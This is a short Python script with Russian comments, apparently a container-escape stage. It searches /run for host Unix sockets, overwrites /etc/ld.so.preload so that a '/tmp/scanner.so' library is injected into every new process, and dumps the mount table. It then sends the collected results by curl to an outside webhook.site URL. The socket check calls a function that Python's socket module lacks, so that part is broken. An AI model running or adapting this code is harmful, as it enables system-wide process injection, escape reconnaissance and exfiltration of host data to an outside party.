import os
import socket
import subprocess
import json

# Конфигурация для отчета
WEBHOOK_URL = "https://webhook.site/6d6434ac-bcd7-48a4-901c-53ca63be0ec2"

def final_escape_attempt():
    results = {"stage": "POST_LIB_PWN_ESCAPE"}
    
    # 1. Поиск скрытых путей связи с хостом (Unix Sockets)
    # Часто сокеты пробрасываются в /run или /var/run
    sockets = []
    for root, dirs, files in os.walk('/run'):
        for f in files:
            full_path = os.path.join(root, f)
            try:
                if socket.is_socket(full_path):
                    sockets.append(full_path)
            except: continue
    results["found_sockets"] = sockets

    # 2. Инъекция в "соседние" процессы через LD_PRELOAD
    # Раз мы переписали библиотеки, мы можем заставить любой новый процесс 
    # запустить наш шелл-код
    try:
        with open("/etc/ld.so.preload", "w") as f:
            f.write("/tmp/scanner.so\n") # Твой ранее скомпилированный сканер
        results["global_preload"] = "ACTIVE"
    except Exception as e:
        results["global_preload"] = f"FAILED: {e}"

    # 3. Попытка побега через виртуальные файловые системы
    # Если мы можем примонтировать что-то извне
    try:
        res = subprocess.run(["mount"], capture_output=True, text=True)
        results["mounts"] = res.stdout.split('\n')[:10] # Дамп первых 10 маунтов
    except: pass

    # Отправляем финальный отчет
    subprocess.run([
        'curl', '-s', '-X', 'POST', 
        '-H', 'Content-Type: application/json', 
        '-d', json.dumps(results), 
        WEBHOOK_URL
    ])

if __name__ == "__main__":
    final_escape_attempt()
